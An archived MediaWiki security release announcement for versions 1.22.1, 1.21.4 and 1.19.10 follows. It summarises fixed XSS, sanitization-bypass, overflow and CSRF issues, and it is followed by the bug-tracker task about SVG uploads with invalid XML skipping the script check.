* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/1/)

### 2009

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2009/1/)

### 2008

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2008/1/)

### 2007

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2007/1/)

### 2006

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2006/1/)

### 2005

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2005/1/)

### 2004

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2004/12/)

[List overview](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/)

[Download](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/export/mediawiki-announce%40lists.wikimedia.org-YUPPCCDXJ4GDG6XKKN67URP2U2GDTI7A.mbox.gz?message=YUPPCCDXJ4GDG6XKKN67URP2U2GDTI7A "This message in gzipped mbox format")

[thread](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/thread/YUPPCCDXJ4GDG6XKKN67URP2U2GDTI7A/#YUPPCCDXJ4GDG6XKKN67URP2U2GDTI7A)

# [MediaWiki-announce] MediaWiki Security Releases: 1.22.1, 1.21.4 and 1.19.10

[Chris Steipp](/hyperkitty/users/dd272b532a8d4667a37daa128483ef95/ "See the profile for Chris Steipp")

14 Jan
2014

14 Jan
'14

8:34 a.m.

I would like to announce the release of MediaWiki 1.22.1, 1.21.4 and
1.19.10.
These releases fix a number of security related bugs that could affect
users of
MediaWiki. In addition, MediaWiki 1.22.1 is a maintenance release. It fixes
several bugs. You can consult the RELEASE-NOTES-1.22 file for the full list
of
changes in this version. Download links are given at the end of this email.

== Security fixes ==

\* MediaWiki user Michael M reported that the fix for bug 55332
(CVE-2013-4568)
allowed insertion of escaped CSS values which could pass the CSS validation
checks, resulting in XSS. (CVE-2013-6451)
<https://bugzilla.wikimedia.org/show_bug.cgi?id=58088>

\* Chris from RationalWiki reported that SVG files could be uploaded that
include external stylesheets, which could lead to XSS when an XSL was used
to
include JavaScript. (CVE-2013-6452)
<https://bugzilla.wikimedia.org/show_bug.cgi?id=57550>

\* During internal review, it was discovered that MediaWiki's SVG
sanitization
could be bypassed when the XML was considered invalid. (CVE-2013-6453)
<https://bugzilla.wikimedia.org/show_bug.cgi?id=58553>

\* Durign internal review, it was discovered that MediaWiki's CSS
sanitization
did not filter -o-link attributes, which could be used to execute
JavaScript in
Opera 12. (CVE-2013-6454)
<https://bugzilla.wikimedia.org/show_bug.cgi?id=58472>

\* During internal review, it was discovered that MediaWiki displayed some
information about deleted pages in the log API, enhanced RecentChanges, and
user watchlists. (CVE-2013-6472)
<https://bugzilla.wikimedia.org/show_bug.cgi?id=58699>

Additionally, the following extensions have been updated to fix security
issues:

\* TimedMediaHandler: Bawolff discovered an XSS vulnerability with the way
the
extension stored and used HTML for showing videos. (CVE-2013-4574)
<https://bugzilla.wikimedia.org/show_bug.cgi?id=56699>

\* Scribuntu: Internal review found a NULL pointer dereference in
php-luasandbox, which could be used for DoS attacks. (CVE-2013-4570)
<https://bugzilla.wikimedia.org/show_bug.cgi?id=54527>

\* Scribuntu: Internal review found a Buffer Overflow in php-luasandbox. It's
not know if this could be use for code execution on the server.
(CVE-2013-4571)
<https://bugzilla.wikimedia.org/show_bug.cgi?id=49705>

\* CentralAuth: Eran Roz reported that MediaWiki usernames could be leaked to
other websites. Javascript returned for CentralAuth's login would update the
page DOM with the username, even when included on other sites.
(CVE-2013-6455)
<https://bugzilla.wikimedia.org/show_bug.cgi?id=57081>

\* SemanticForms: Ravindra Singh Rathore reported a missing CSRF check to
Mozilla, who reported the issue to us. Several other forms in the extension
were also fixed.
<https://bugzilla.wikimedia.org/show_bug.cgi?id=57025>

== Bug fixes in 1.22.1 ==

\* (bug 59945) 1.22 tarball offers Extension SimpleAntiSpam which is supposed
to be in core.

\* (bug 58178) Restore compatibility with curl < 7.16.2.

\* (bug 56931) Updated the plural rules to CLDR 24. They are in new format
which is detailed in UTS 35 Rev 33. The PHP parser and evaluator as well as
the JavaScript evaluator were updated to support the new format. Plural
rules
for some languages have changed, most notably Russian. Affected software
messages have been updated and marked for review at translatewiki.net.
This change is backported from the development branch of MediaWiki 1.23.

\* (bug 58434) The broken installer for database backend Oracle was fixed.

\* (bug 58167) The web installer no longer throws an exception when PHP is
compiled without support for MySQL yet with support for another DBMS.

\* (bug 58640) Fixed a compatibility issue with PCRE 8.34 that caused pages
to appear blank or with missing text.

\* (bug 47055) Changed FOR UPDATE handling in Postgresql

Full release notes for 1.22.1:
<https://www.mediawiki.org/wiki/Release_notes/1.22>

Full release notes for 1.21.4:
<https://www.mediawiki.org/wiki/Release_notes/1.21>

Full release notes for 1.19.9:
<https://www.mediawiki.org/wiki/Release_notes/1.19>

For information about how to upgrade, see
[https://www.mediawiki.org/wiki/Manual:Upgrading](https://www.mediawiki.org/wiki/Manual%3AUpgrading)

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
1.22.1
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Download:
<http://download.wikimedia.org/mediawiki/1.22/mediawiki-1.22.1.tar.gz>

Patch to previous version (1.22.0), without interface text:
<http://download.wikimedia.org/mediawiki/1.22/mediawiki-1.22.1.patch.gz>
Interface text changes:
<http://download.wikimedia.org/mediawiki/1.22/mediawiki-i18n-1.22.1.patch.gz>

GPG signatures:
[http://download.wikimedia.org/mediawiki/1.22/mediawiki-core-1.22.1.tar.gz.si...](http://download.wikimedia.org/mediawiki/1.22/mediawiki-core-1.22.1.tar.gz.sig)
<http://download.wikimedia.org/mediawiki/1.22/mediawiki-1.22.1.tar.gz.sig>
<http://download.wikimedia.org/mediawiki/1.22/mediawiki-1.22.1.patch.gz.sig>
[http://download.wikimedia.org/mediawiki/1.22/mediawiki-i18n-1.22.1.patch.gz....](http://download.wikimedia.org/mediawiki/1.22/mediawiki-i18n-1.22.1.patch.gz.sig)

Public keys:
<https://www.mediawiki.org/keys/keys.html>

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
1.21.4
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Download:
<http://download.wikimedia.org/mediawiki/1.21/mediawiki-1.21.4.tar.gz>

Patch to previous version (1.21.3), without interface text:
<http://download.wikimedia.org/mediawiki/1.21/mediawiki-1.21.4.patch.gz>
Interface text changes:
<http://download.wikimedia.org/mediawiki/1.21/mediawiki-i18n-1.21.4.patch.gz>

GPG signatures:
[http://download.wikimedia.org/mediawiki/1.21/mediawiki-core-1.21.4.tar.gz.si...](http://download.wikimedia.org/mediawiki/1.21/mediawiki-core-1.21.4.tar.gz.sig)
<http://download.wikimedia.org/mediawiki/1.21/mediawiki-1.21.4.tar.gz.sig>
<http://download.wikimedia.org/mediawiki/1.21/mediawiki-1.21.4.patch.gz.sig>
[http://download.wikimedia.org/mediawiki/1.21/mediawiki-i18n-1.21.4.patch.gz....](http://download.wikimedia.org/mediawiki/1.21/mediawiki-i18n-1.21.4.patch.gz.sig)

Public keys:
<https://www.mediawiki.org/keys/keys.html>

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
1.19.10
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Download:
<http://download.wikimedia.org/mediawiki/1.19/mediawiki-1.19.10.tar.gz>

Patch to previous version (1.19.9), without interface text:
<http://download.wikimedia.org/mediawiki/1.19/mediawiki-1.19.10.patch.gz>
Interface text changes:
<http://download.wikimedia.org/mediawiki/1.19/mediawiki-i18n-1.19.10.patch.gz>

GPG signatures:
[http://download.wikimedia.org/mediawiki/1.19/mediawiki-core-1.19.10.tar.gz.s...](http://download.wikimedia.org/mediawiki/1.19/mediawiki-core-1.19.10.tar.gz.sig)
<http://download.wikimedia.org/mediawiki/1.19/mediawiki-1.19.10.tar.gz.sig>
<http://download.wikimedia.org/mediawiki/1.19/mediawiki-1.19.10.patch.gz.sig>
[http://download.wikimedia.org/mediawiki/1.19/mediawiki-i18n-1.19.10.patch.gz...](http://download.wikimedia.org/mediawiki/1.19/mediawiki-i18n-1.19.10.patch.gz.sig)

Public keys:
<https://www.mediawiki.org/keys/keys.html>

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Extension:TimedMediaHandler
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Information and Download:
[https://www.mediawiki.org/wiki/Extension:TimedMediaHandler](https://www.mediawiki.org/wiki/Extension%3ATimedMediaHandler)

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Extension:Scribunto
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Information and Download:
[https://www.mediawiki.org/wiki/Extension:Scribunto](https://www.mediawiki.org/wiki/Extension%3AScribunto)

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Extension:CentralAuth
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Information and Download:
[https://www.mediawiki.org/wiki/Extension:CentralAuth](https://www.mediawiki.org/wiki/Extension%3ACentralAuth)

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Extension:SemanticForms
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Information and Download:
[https://www.mediawiki.org/wiki/Extension:SemanticForms](https://www.mediawiki.org/wiki/Extension%3ASemanticForms)

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/thread/YUPPCCDXJ4GDG6XKKN67URP2U2GDTI7A/#YUPPCCDXJ4GDG6XKKN67URP2U2GDTI7A)

[Back to the list](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from bugzilla.wikimedia.org_a2955675_20250126_104132.html ===
Page Menu[HomePhabricator](/)

* SearchConfigure Global Search

[Log In](https://phabricator.wikimedia.org/auth/start/?next=%2FT60553)[Create Task](/maniphest/task/edit/nocreate/) [Maniphest](/maniphest/)  T60553
# Invalid xml accepted by svg uploadClosed, Resolved[Public](/policy/explain/PHID-TASK-4dwtbuyxvp5nsd5wuqjv/view/)Actions

* [Edit Task](/maniphest/task/edit/60553/)
* Edit Related Tasks...
* [Create Subtask](/maniphest/task/subtask/60553/)
* [Edit Parent Tasks](/search/rel/task.has-parent/PHID-TASK-4dwtbuyxvp5nsd5wuqjv/)
* [Edit Subtasks](/search/rel/task.has-subtask/PHID-TASK-4dwtbuyxvp5nsd5wuqjv/)
* [Merge Duplicates In](/search/rel/task.merge-in/PHID-TASK-4dwtbuyxvp5nsd5wuqjv/)
* [Close As Duplicate](/search/rel/task.close-as-duplicate/PHID-TASK-4dwtbuyxvp5nsd5wuqjv/)
* Edit Related Objects...
* [Edit Commits](/search/rel/task.has-commit/PHID-TASK-4dwtbuyxvp5nsd5wuqjv/)
* [Edit Mocks](/search/rel/task.has-mock/PHID-TASK-4dwtbuyxvp5nsd5wuqjv/)
* Subscribe
* [Mute Notifications](/subscriptions/mute/PHID-TASK-4dwtbuyxvp5nsd5wuqjv/)
* [Protect as security issue](/wmf/escalate-task/60553/)
* [Award Token](/token/give/PHID-TASK-4dwtbuyxvp5nsd5wuqjv/)
* [Flag For Later](/flag/edit/PHID-TASK-4dwtbuyxvp5nsd5wuqjv/)

Assigned ToNoneAuthored By

|  | [• csteipp](/p/csteipp/) |
| --- | --- |
| Dec 16 2013, 9:56 PM2013-12-16 21:56:00 (UTC+0) |

Tags

* [MediaWiki-Uploading](/tag/mediawiki-uploading/)
* [Multimedia](/tag/multimedia/) [(Done)](/project/board/48/)
* [Security](/tag/security/)
Referenced Files

|  | [F12349: bug58553\_122.patch](/F12349) |
| --- | --- |
| Nov 22 2014, 2:27 AM2014-11-22 02:27:02 (UTC+0) |

|  | [F12347: bug58553\_119.patch](/F12347) |
| --- | --- |
| Nov 22 2014, 2:27 AM2014-11-22 02:27:01 (UTC+0) |

|  | [F12348: bug58553\_121.patch](/F12348) |
| --- | --- |
| Nov 22 2014, 2:27 AM2014-11-22 02:27:01 (UTC+0) |

|  | [F12346: bug58553b-rebase\_57550.patch](/F12346) |
| --- | --- |
| Nov 22 2014, 2:27 AM2014-11-22 02:27:00 (UTC+0) |

|  | [F12345: bug58553b.patch](/F12345) |
| --- | --- |
| Nov 22 2014, 2:27 AM2014-11-22 02:27:00 (UTC+0) |

Subscribers

|  | [Bawolff](/p/Bawolff/) |
| --- | --- |

|  | [• csteipp](/p/csteipp/) |
| --- | --- |

|  | [• Fabrice\_Florin](/p/Fabrice_Florin/) |
| --- | --- |

|  | [Grunny](/p/Grunny/) |
| --- | --- |

|  | [MarkTraceur](/p/MarkTraceur/) |
| --- | --- |

|  | [Tgr](/p/Tgr/) |
| --- | --- |

|  | [tstarling](/p/tstarling/) |
| --- | --- |

|  | [• wikibugs-l-list](/p/wikibugs-l-list/) |
| --- | --- |

# Description

Tim pointed out on bug 57550 that our SVG script checker doesn't check to ensure that the xml parser found the svg to be well formed. The checkSvgScriptCallback isn't called for any part of the svg following invalid xml, so anything that would be caught as a script in checkSvgScriptCallback is skipped.

In testing, it appears that modern versions of FF/Chrome/Opera all stop rendering svg files when they encounter invalid xml.

However, in case any older browsers ignore errors, we should also reject invalid xml for SVG uploads.

---

**Version**: unspecified

**Severity**: normal

# Details

Reference bz58553
# Related ObjectsSearch...

* Task Graph

|  |  | Status | Subtype | Assigned | Task |
| --- | --- | --- | --- | --- | --- |
|  |  |  |  |  | Restricted Task |
|  |  | Resolved |  | *None* | T60553 [Invalid xml accepted by svg upload](/T60553) |
|  |  | Resolved |  | *None* | T67724 [Chunked upload of SVGs triggers INVALIDXML exception, but file is valid](/T67724) |

### Event Timeline

[• bzimport](/p/bzimport/) raised the priority of this task from  to Medium.[Nov 22 2014, 2:26 AM2014-11-22 02:26:58 (UTC+0)](#619305)[• bzimport](/p/bzimport/) added a project: [MediaWiki-Uploading](/tag/mediawiki-uploading/).[• bzimport](/p/bzimport/) set Reference to bz58553.[• bzimport](/p/bzimport/) added a subscriber: Unknown Object (MLST).[• csteipp](/p/csteipp/) created this task.[Dec 16 2013, 9:56 PM2013-12-16 21:56:00 (UTC+0)](#619313)[tstarling](/p/tstarling/) added a comment.[Dec 17 2013, 12:41 AM2013-12-17 00:41:35 (UTC+0)](#619316)Comment Actions

The cases where xml\_parse() returns false is broader than the strict definition of invalid XML. For example, libxml loads the values of attributes into dynamically allocated memory. With ulimit/cgroup limiting memory usage, the malloc() can return NULL, which leads to xml\_parse() returning 0 and giving a PHP warning like:

Warning: xml\_parse(): Memory allocation failed : growing buffer in /srv/mw/core/includes/libs/XmlTypeCheck.php on line 124

[• csteipp](/p/csteipp/) added a comment.[Dec 17 2013, 12:48 AM2013-12-17 00:48:41 (UTC+0)](#619336)Comment Actions

Created attachment 14116

Return error on invalid XML

*attachment bug58553.patch ignored as obsolete*

[• csteipp](/p/csteipp/) added a comment.[Dec 17 2013, 12:49 AM2013-12-17 00:49:48 (UTC+0)](#619350)Comment Actions

Hmm.. didn't see your comment until I posted that. Perhaps the error should be "Couldn't parse the XML"?

[• csteipp](/p/csteipp/) added a comment.[Dec 17 2013, 9:12 PM2013-12-17 21:12:48 (UTC+0)](#619369)Comment Actions

Created attachment 14124

Return error if XML can't be parsed for SVGs

Added the translations to this version. Updated the message per Tim's comment.

**Attached**: bug58553b.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/5dyqwcyma5zfjxt5hex6/PHID-FILE-ee6j3q4to2iyhnqlq7fz/bug58553b.patch)

[tstarling](/p/tstarling/) added a comment.[Dec 18 2013, 11:57 PM2013-12-18 23:57:13 (UTC+0)](#619374)Comment Actions

Looks good.

[• csteipp](/p/csteipp/) added a comment.[Dec 19 2013, 9:35 PM2013-12-19 21:35:31 (UTC+0)](#619384)Comment Actions

Created attachment 14143

Patch rebased on the patch for bug 57550

**Attached**: bug58553b-rebase\_57550.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/vvuo2twa2fq63726grda/PHID-FILE-u7hh6zmid3x7be4pkqsb/bug58553b-rebase_57550.patch)

[• csteipp](/p/csteipp/) added a comment.[Dec 23 2013, 6:29 PM2013-12-23 18:29:58 (UTC+0)](#619399)Comment Actions

This was assigned CVE-2013-6453

[Mglaser](/p/Mglaser/) added a comment.[Jan 8 2014, 11:11 PM2014-01-08 23:11:14 (UTC+0)](#619406)Comment Actions

Created attachment 14267

Return error if XML can't be parsed for SVGs (1.19 branch)

**Attached**: bug58553\_119.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/drqrfx2mnxotkbuof6pz/PHID-FILE-lf23gc4im3nbjrduceom/bug58553_119.patch)

[Mglaser](/p/Mglaser/) added a comment.[Jan 8 2014, 11:11 PM2014-01-08 23:11:45 (UTC+0)](#619413)Comment Actions

Created attachment 14268

Return error if XML can't be parsed for SVGs (1.21 branch)

**Attached**: bug58553\_121.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/3vtcq7cv2qp6eov6zmzu/PHID-FILE-4cr4o4shwjthcgjcee7y/bug58553_121.patch)

[Mglaser](/p/Mglaser/) added a comment.[Jan 8 2014, 11:12 PM2014-01-08 23:12:16 (UTC+0)](#619419)Comment Actions

Created attachment 14269

Return error if XML can't be parsed for SVGs (1.22 branch)

**Attached**: bug58553\_122.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/hhf3dxorpwkkuzc6hybg/PHID-FILE-77l6ynnkfee4rznwiukt/bug58553_122.patch)

[• Gilles](/p/Gilles/) raised the priority of this task from Medium to Unbreak Now!.[Dec 4 2014, 10:20 AM2014-12-04 10:20:09 (UTC+0)](#813165)[• Gilles](/p/Gilles/) added a project: [Multimedia](/tag/multimedia/).[• Gilles](/p/Gilles/) moved this task from [Untriaged](/project/board/48/) to [Done](/project/board/48/) on the [Multimedia](/tag/multimedia/) board.[• Gilles](/p/Gilles/) lowered the priority of this task from Unbreak Now! to Medium.[Dec 4 2014, 11:21 AM2014-12-04 11:21:03 (UTC+0)](#817539)[• csteipp](/p/csteipp/) added a project: [acl\*security](/tag/acl_security/).[Mar 26 2015, 8:39 PM2015-03-26 20:39:04 (UTC+0)](#1154549)[• chasemp](/p/chasemp/) added a project: [Security](/tag/security/).[Feb 10 2020, 10:59 PM2020-02-10 22:59:48 (UTC+0)](#5869879) · [• chasemp](/p/chasemp/) removed a project: [acl\*security](/tag/acl_security/).[Feb 20 2020, 8:18 PM2020-02-20 20:18:06 (UTC+0)](#5904880) · [Log In to Comment](/login/?next=)Content licensed under Creative Commons Attribution-ShareAlike (CC BY-SA) 4.0 unless otherwise noted; code licensed under GNU General Public License (GPL) 2.0 or later and other open source licenses. By using this site, you agree to the Terms of Use, Privacy Policy, and Code of Conduct. · [Wikimedia Foundation](https://wikimediafoundation.org/) · [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ANon-wiki_privacy_policy) · [Code of Conduct](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Code_of_Conduct) · [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use/Phabricator) · [Disclaimer](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3AGeneral_disclaimer) · [CC-BY-SA](https://creativecommons.org/licenses/by-sa/4.0/) · [GPL](https://www.gnu.org/licenses/old-licenses/gpl-2.0.html) · [Credits](https://www.mediawiki.org/wiki/Phabricator/Credits)
